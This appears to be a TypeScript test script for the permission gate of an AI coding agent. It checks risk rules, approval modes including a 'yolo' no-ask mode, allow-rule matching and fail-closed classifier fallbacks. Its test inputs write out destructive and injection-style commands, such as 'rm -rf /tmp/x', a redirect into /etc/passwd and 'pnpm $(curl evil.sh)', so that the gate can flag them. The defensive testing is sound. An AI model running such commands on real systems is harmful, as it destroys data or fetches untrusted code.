/**
 * Permission approval modes: static risk rules and per-mode gate behavior.
 *
 * No model calls: the classifier is stubbed, so this covers the decision table
 * (default / auto / yolo), the whitelist rules, and every classifier failure
 * path — which must all land on "ask", never on silent approval.
 *
 * Run: pnpm tsx spike/verify-permission-modes.ts
 */
import type { BeforeToolCallEvent } from '@strands-agents/sdk';

import {
  PermissionGate,
  assessRisk,
  classify,
  type AssessedPermissionRequest,
  type PermissionDecision,
  type PermissionGateOptions,
  type SafetyClassifier,
} from '../src/agent/permission.js';
import { isValidRule, matchesAnyRule, suggestRules } from '../src/agent/permission-rules.js';
import { assert, header, report } from './shared.js';

const ROOT = '/tmp/darwin-permission-modes';

function riskOf(toolName: string, input: unknown): { risk: string; riskReason: string } {
  return assessRisk(classify(toolName, input), ROOT);
}

function staticRules(): void {
  header('static risk rules — bash');

  const safeBash = [
    'git status',
    'git log --oneline -5',
    'ls -la src',
    'cat package.json | grep name',
    'rg PermissionGate src && echo found',
  ];
  for (const command of safeBash) {
    assert(`safe: ${command}`, riskOf('bash', { command }).risk === 'safe');
  }

  const dangerousBash = [
    ['git push origin main', 'non-read-only git'],
    ['ls && rm -rf /tmp/x', 'chained write'],
    ['echo hi > file', 'redirection'],
    ['cat $(find . -name secret)', 'substitution'],
    ['ls `whoami`', 'backticks'],
    ['pnpm typecheck', 'not allowlisted'],
    ['', 'empty command'],
  ] as const;
  for (const [command, why] of dangerousBash) {
    assert(`dangerous (${why}): ${command || '(empty)'}`, riskOf('bash', { command }).risk === 'dangerous');
  }

  assert('bash restart is safe (read kind)', riskOf('bash', { mode: 'restart' }).risk === 'safe');

  header('static risk rules — fileEditor');

  const edit = (path: string) => riskOf('fileEditor', { command: 'str_replace', path, old_str: 'a', new_str: 'b' });

  assert('in-project write is safe', edit(`${ROOT}/src/index.ts`).risk === 'safe');
  assert('relative in-project write is safe', edit('src/index.ts').risk === 'safe');
  assert('view is safe anywhere', riskOf('fileEditor', { command: 'view', path: '/etc/passwd' }).risk === 'safe');
  assert('write outside project is dangerous', edit('/etc/passwd').risk === 'dangerous');
  assert('.. escape is dangerous', edit(`${ROOT}/../other/file`).risk === 'dangerous');
  assert('.git internals are dangerous', edit(`${ROOT}/.git/config`).risk === 'dangerous');
  assert('.env is dangerous', edit(`${ROOT}/.env`).risk === 'dangerous');
  assert('.env.local is dangerous', edit(`${ROOT}/.env.local`).risk === 'dangerous');
  assert('.darwin/config.json is dangerous', edit(`${ROOT}/.darwin/config.json`).risk === 'dangerous');

  header('static risk rules — other tools');

  assert('load_skill is safe', riskOf('load_skill', { name: 'x' }).risk === 'safe');
  assert('subagent delegation is safe', riskOf('subagent', { task: 'inspect', agent: 'general' }).risk === 'safe');
  assert(
    'unknown / MCP tools are dangerous',
    riskOf('mcp__server__do_thing', { arg: 1 }).risk === 'dangerous',
  );
}

/**
 * Minimal stand-in for the SDK event. The gate reads `toolUse` and the calling
 * agent's id (for provenance), and the real event always carries both.
 */
function fakeEvent(name: string, input: unknown, agentId = 'darwin'): BeforeToolCallEvent {
  return { toolUse: { name, input }, agent: { id: agentId } } as unknown as BeforeToolCallEvent;
}

interface GateRun {
  action: { type: string; reason?: string };
  asked: AssessedPermissionRequest[];
}

function actionReason(action: GateRun['action']): string {
  return action.reason ?? '';
}

async function runGate(
  options: Partial<PermissionGateOptions> & { mode: PermissionGateOptions['mode'] },
  toolName: string,
  input: unknown,
  answer: boolean | PermissionDecision = true,
  agentId = 'darwin',
): Promise<GateRun> {
  const asked: AssessedPermissionRequest[] = [];
  const gate = new PermissionGate({
    projectRoot: ROOT,
    ask: async (request) => {
      asked.push(request);
      return typeof answer === 'boolean' ? { allowed: answer } : answer;
    },
    ...options,
  });
  const action = (await gate.beforeToolCall(fakeEvent(toolName, input, agentId))) as GateRun['action'];
  return { action, asked };
}

const DANGEROUS_BASH = { command: 'rm -rf /tmp/x' };
const SAFE_BASH = { command: 'git status' };

async function gateModes(): Promise<void> {
  header('gate — default mode');

  let run = await runGate({ mode: 'default' }, 'bash', SAFE_BASH);
  assert('safe call proceeds without asking', run.action.type === 'proceed' && run.asked.length === 0);

  run = await runGate({ mode: 'default' }, 'bash', DANGEROUS_BASH, true);
  assert('dangerous call asks, approval proceeds', run.action.type === 'proceed' && run.asked.length === 1);

  run = await runGate({ mode: 'default' }, 'bash', DANGEROUS_BASH, false);
  assert('dangerous call asks, refusal denies', run.action.type === 'deny' && run.asked.length === 1);
  assert(
    'the prompt carried the risk reason',
    run.asked[0] !== undefined && run.asked[0].riskReason.length > 0,
  );

  header('gate — yolo mode');

  run = await runGate({ mode: 'yolo' }, 'bash', DANGEROUS_BASH);
  assert('dangerous call proceeds without asking', run.action.type === 'proceed' && run.asked.length === 0);

  run = await runGate({ mode: 'yolo' }, 'mcp__anything__at_all', {});
  assert('unknown tool proceeds without asking', run.action.type === 'proceed' && run.asked.length === 0);

  header('gate — plan mode');

  run = await runGate({ mode: 'plan' }, 'fileEditor', { command: 'view', path: `${ROOT}/src/index.ts` });
  assert('read-classified calls proceed without asking', run.action.type === 'proceed' && run.asked.length === 0);

  run = await runGate(
    { mode: 'plan', allowRules: ['fileEditor'] },
    'fileEditor',
    { command: 'str_replace', path: `${ROOT}/src/index.ts`, old_str: 'a', new_str: 'b' },
  );
  assert('a statically safe write is denied before an allow rule', run.action.type === 'deny' && run.asked.length === 0);
  assert(
    'write denial is actionable and names plan mode',
    actionReason(run.action).includes('Plan mode blocked this write call') &&
      actionReason(run.action).includes('run outside plan mode'),
  );

  let planClassifierCalls = 0;
  const planClassifier: SafetyClassifier = async () => {
    planClassifierCalls += 1;
    return { safe: true, reason: 'approve everything' };
  };
  run = await runGate(
    { mode: 'plan', classifier: planClassifier, allowRules: ['bash'] },
    'bash',
    SAFE_BASH,
  );
  assert(
    'execute is denied before prompt, classifier, and broad allow rule',
    run.action.type === 'deny' && run.asked.length === 0 && planClassifierCalls === 0,
  );
  assert('execute denial identifies its kind and tool', actionReason(run.action).includes('execute call to bash'));

  run = await runGate(
    { mode: 'plan', allowRules: ['mcp__anything__at_all'] },
    'mcp__anything__at_all',
    {},
  );
  assert('unknown/MCP tools remain fail-closed as execute', run.action.type === 'deny' && run.asked.length === 0);

  header('gate — auto mode');

  const saysSafe: SafetyClassifier = async () => ({ safe: true, reason: 'harmless temp cleanup' });
  const saysUnsafe: SafetyClassifier = async () => ({ safe: false, reason: 'destructive delete' });
  const throws: SafetyClassifier = async () => {
    throw new Error('service down');
  };
  const hangs: SafetyClassifier = () => new Promise(() => undefined);

  run = await runGate({ mode: 'auto', classifier: saysSafe }, 'bash', SAFE_BASH);
  assert('statically safe call skips the classifier and proceeds', run.action.type === 'proceed' && run.asked.length === 0);

  run = await runGate({ mode: 'auto', classifier: saysSafe }, 'bash', DANGEROUS_BASH);
  assert('classifier-safe verdict proceeds without asking', run.action.type === 'proceed' && run.asked.length === 0);

  run = await runGate({ mode: 'auto', classifier: saysUnsafe }, 'bash', DANGEROUS_BASH, true);
  assert('classifier-unsafe verdict escalates to the user', run.asked.length === 1 && run.action.type === 'proceed');
  assert(
    'escalation shows the classifier reason as a detail block',
    run.asked[0]?.details.some((d) => d.label === 'Classifier' && d.value.includes('destructive')) === true,
  );

  run = await runGate({ mode: 'auto', classifier: throws }, 'bash', DANGEROUS_BASH, false);
  assert('classifier throw falls back to asking (fail-closed)', run.asked.length === 1 && run.action.type === 'deny');

  run = await runGate({ mode: 'auto', classifier: hangs, classifierTimeoutMs: 25 }, 'bash', DANGEROUS_BASH, false);
  assert('classifier hang times out and falls back to asking', run.asked.length === 1 && run.action.type === 'deny');

  run = await runGate({ mode: 'auto' }, 'bash', DANGEROUS_BASH, false);
  assert('auto without a classifier still asks', run.asked.length === 1 && run.action.type === 'deny');
}

/** Rules are matched against `(toolName, input)`, exactly like classification. */
function covered(rules: readonly string[], toolName: string, input: unknown): boolean {
  return matchesAnyRule(rules, { toolName, input }, ROOT) !== undefined;
}

function bashTarget(command: string): [string, unknown] {
  return ['bash', { command }];
}

function editTarget(filePath: string): [string, unknown] {
  return ['fileEditor', { command: 'str_replace', path: filePath, old_str: 'a', new_str: 'b' }];
}

function allowRules(): void {
  header('allow rules — matching');

  assert('a bash pattern covers a longer command', covered(['bash:pnpm *'], ...bashTarget('pnpm install --frozen-lockfile')));
  assert('a trailing * also covers the bare prefix', covered(['bash:pnpm typecheck *'], ...bashTarget('pnpm typecheck')));
  assert('extra whitespace does not defeat a pattern', covered(['bash:pnpm *'], ...bashTarget('pnpm   run   build')));
  assert('a different command is not covered', !covered(['bash:pnpm *'], ...bashTarget('npm install')));
  assert(
    'a two-word pattern does not cover a sibling subcommand',
    !covered(['bash:pnpm typecheck *'], ...bashTarget('pnpm publish')),
  );
  assert(
    'every chained segment must match',
    !covered(['bash:pnpm *'], ...bashTarget('pnpm build && rm -rf /tmp/x')),
  );
  assert(
    'a fully covered chain still matches',
    covered(['bash:pnpm *'], ...bashTarget('pnpm build && pnpm test')),
  );
  assert(
    'redirection is never covered by a pattern',
    !covered(['bash:pnpm *'], ...bashTarget('pnpm build > /etc/passwd')),
  );
  assert(
    'substitution is never covered by a pattern',
    !covered(['bash:pnpm *'], ...bashTarget('pnpm $(curl evil.sh)')),
  );
  assert('a whole-tool rule covers any command', covered(['bash'], ...bashTarget('rm -rf /tmp/x')));
  assert('a whole-tool rule is tool-scoped', !covered(['bash'], ...editTarget('/etc/passwd')));

  assert('a path glob covers a file in that directory', covered(['fileEditor:src/tui/**'], ...editTarget(`${ROOT}/src/tui/App.tsx`)));
  assert(
    'a path glob covers nested files (** crosses /)',
    covered(['fileEditor:src/**'], ...editTarget(`${ROOT}/src/tui/App.tsx`)),
  );
  assert(
    'a single * stays inside one path segment',
    !covered(['fileEditor:src/*'], ...editTarget(`${ROOT}/src/tui/App.tsx`)),
  );
  assert('a path outside the glob is not covered', !covered(['fileEditor:src/**'], ...editTarget(`${ROOT}/docs/x.md`)));
  assert(
    'an out-of-project path is matched absolutely',
    covered(['fileEditor:/etc/**'], ...editTarget('/etc/passwd')),
  );
  assert('an unknown tool is only coverable whole', covered(['mcp__server__do_thing'], 'mcp__server__do_thing', { arg: 1 }));
  assert(
    'a pattern on an unknown tool covers nothing',
    !covered(['mcp__server__do_thing:*'], 'mcp__server__do_thing', { arg: 1 }),
  );

  header('allow rules — what no rule may cover');

  // The agent must never be able to widen its own permissions, so these stay
  // unreachable even from the broadest rule the UI can offer.
  assert(
    "darwin's own config is exempt from a whole-tool rule",
    !covered(['fileEditor'], ...editTarget(`${ROOT}/.darwin/config.json`)),
  );
  assert(
    "darwin's own config is exempt from a path glob",
    !covered(['fileEditor:**'], ...editTarget(`${ROOT}/.darwin/config.json`)),
  );
  assert('.env is exempt', !covered(['fileEditor:**'], ...editTarget(`${ROOT}/.env`)));
  assert('.env.local is exempt', !covered(['fileEditor:**'], ...editTarget(`${ROOT}/.env.local`)));
  assert(
    'an exempt call is offered no rule at all',
    suggestRules({ toolName: 'fileEditor', input: { path: `${ROOT}/.env` } }, ROOT).length === 0,
  );

  header('allow rules — suggestions');

  const suggestionsFor = (toolName: string, input: unknown): string[] =>
    suggestRules({ toolName, input }, ROOT).map((suggestion) => suggestion.rule);

  assert(
    'a subcommand driver keeps its subcommand',
    suggestionsFor('bash', { command: 'pnpm typecheck --watch' })[0] === 'bash:pnpm typecheck *',
  );
  assert(
    'a flag is not mistaken for a subcommand',
    suggestionsFor('bash', { command: 'node --version' })[0] === 'bash:node *',
  );
  assert(
    'a plain command suggests its first word',
    suggestionsFor('bash', { command: 'rm -rf /tmp/x' })[0] === 'bash:rm *',
  );
  assert(
    'the whole tool is always the last offer',
    suggestionsFor('bash', { command: 'rm -rf /tmp/x' })[1] === 'bash',
  );
  assert(
    'a write suggests its directory',
    suggestionsFor('fileEditor', { command: 'create', path: `${ROOT}/src/tui/App.tsx` })[0] ===
      'fileEditor:src/tui/**',
  );
  assert(
    'a project-root write suggests the project glob',
    suggestionsFor('fileEditor', { command: 'create', path: `${ROOT}/README.md` })[0] === 'fileEditor:**',
  );
  assert(
    'an unknown tool is offered the whole tool only',
    JSON.stringify(suggestionsFor('mcp__server__do_thing', { arg: 1 })) === '["mcp__server__do_thing"]',
  );
  assert(
    'every suggested rule is a valid rule',
    [
      ...suggestionsFor('bash', { command: 'pnpm typecheck' }),
      ...suggestionsFor('fileEditor', { command: 'create', path: `${ROOT}/src/x.ts` }),
      ...suggestionsFor('mcp__server__do_thing', {}),
    ].every(isValidRule),
  );

  header('allow rules — rule syntax validation');

  for (const rule of ['bash', 'bash:pnpm *', 'fileEditor:src/**', 'mcp__server__tool']) {
    assert(`valid: ${rule}`, isValidRule(rule));
  }
  for (const rule of ['', '   ', ':pattern', 'bash:', 'bash:   ']) {
    assert(`invalid: ${JSON.stringify(rule)}`, !isValidRule(rule));
  }
}

/** Answers with the narrowest offer attached, the way pressing `a` does. */
function withNarrowestRule(allowed: boolean) {
  return async (request: AssessedPermissionRequest): Promise<PermissionDecision> => {
    const rule = request.suggestions[0]?.rule;
    return rule === undefined ? { allowed } : { allowed, rule };
  };
}

async function gateRules(): Promise<void> {
  header('gate — allow rules');

  let run = await runGate({ mode: 'default', allowRules: ['bash:rm *'] }, 'bash', DANGEROUS_BASH);
  assert('a covered call proceeds without asking', run.action.type === 'proceed' && run.asked.length === 0);
  assert('the reason names the rule', run.action.reason?.includes('bash:rm *') === true);

  run = await runGate({ mode: 'default', allowRules: ['bash:pnpm *'] }, 'bash', DANGEROUS_BASH);
  assert('an uncovered call still asks', run.asked.length === 1);

  // The whole point of checking rules before the classifier: a rule the user wrote
  // down should save the model call, not just the prompt.
  let classifierCalls = 0;
  const counting: SafetyClassifier = async () => {
    classifierCalls += 1;
    return { safe: false, reason: 'destructive delete' };
  };
  run = await runGate(
    { mode: 'auto', classifier: counting, allowRules: ['bash:rm *'] },
    'bash',
    DANGEROUS_BASH,
  );
  assert(
    'a rule is consulted before the classifier',
    run.action.type === 'proceed' && classifierCalls === 0,
  );

  header('gate — accepting a rule');

  const gate = new PermissionGate({
    mode: 'default',
    projectRoot: ROOT,
    ask: withNarrowestRule(true),
  });

  const first = (await gate.beforeToolCall(fakeEvent('bash', DANGEROUS_BASH))) as GateRun['action'];
  assert('the answered call proceeds', first.type === 'proceed');
  assert('the accepted rule is now in effect', gate.allowRules.includes('bash:rm *'));

  const asked: AssessedPermissionRequest[] = [];
  const askAgain = new PermissionGate({
    mode: 'default',
    projectRoot: ROOT,
    allowRules: gate.allowRules,
    ask: async (request) => {
      asked.push(request);
      return { allowed: false };
    },
  });
  const second = (await askAgain.beforeToolCall(
    fakeEvent('bash', { command: 'rm -rf /tmp/other' }),
  )) as GateRun['action'];
  assert(
    'a later matching call is no longer asked about',
    second.type === 'proceed' && asked.length === 0,
  );

  // A rule only means "always allow"; hanging one off a refusal would record the
  // opposite of what the user said.
  const denied = new PermissionGate({
    mode: 'default',
    projectRoot: ROOT,
    ask: withNarrowestRule(false),
  });
  const denialAction = (await denied.beforeToolCall(
    fakeEvent('bash', DANGEROUS_BASH),
  )) as GateRun['action'];
  assert(
    'a rule attached to a denial is discarded',
    denialAction.type === 'deny' && denied.allowRules.length === 0,
  );

  header('gate — yolo ignores rules entirely');

  run = await runGate({ mode: 'yolo', allowRules: [] }, 'bash', DANGEROUS_BASH);
  assert('yolo proceeds with no rules at all', run.action.type === 'proceed' && run.asked.length === 0);
}

/**
 * Provenance at the gate boundary: one gate serves the parent and every child, so
 * what a bridge sees has to say which of them a call belongs to.
 */
async function gateProvenance(): Promise<void> {
  header('gate — every request carries its originating agent');

  const parentRun = await runGate({ mode: 'default' }, 'bash', DANGEROUS_BASH);
  assert(
    'a call from the assembled agent is labelled parent',
    parentRun.asked[0]?.source.kind === 'parent' && parentRun.asked[0]?.source.label === 'parent',
  );

  const childId = 'darwin-subagent-explorer-0000';
  const childRun = await runGate(
    {
      mode: 'default',
      dispatchSource: (agentId) =>
        agentId === childId
          ? { dispatchId: 'a1b2c3d4', agentName: 'explorer', label: 'explorer#a1b2c3d4' }
          : undefined,
    },
    'bash',
    DANGEROUS_BASH,
    true,
    childId,
  );
  const childSource = childRun.asked[0]?.source;
  assert('a tracked dispatch is labelled with its own identity', childSource?.kind === 'child');
  assert('the child label is ready to render', childSource?.label === 'explorer#a1b2c3d4');
  assert('the child source names its dispatch', childSource?.dispatchId === 'a1b2c3d4' && childSource?.agentName === 'explorer');

  // Without a resolver every call reads as the parent's: that is the truth for a
  // runtime with no delegation, and it must never invent a child label.
  const unresolved = await runGate({ mode: 'default' }, 'bash', DANGEROUS_BASH, true, childId);
  assert('an unknown agent id stays parent rather than guessing', unresolved.asked[0]?.source.kind === 'parent');
}

async function main(): Promise<void> {
  staticRules();
  allowRules();
  await gateModes();
  await gateRules();
  await gateProvenance();
  report();
}

await main();
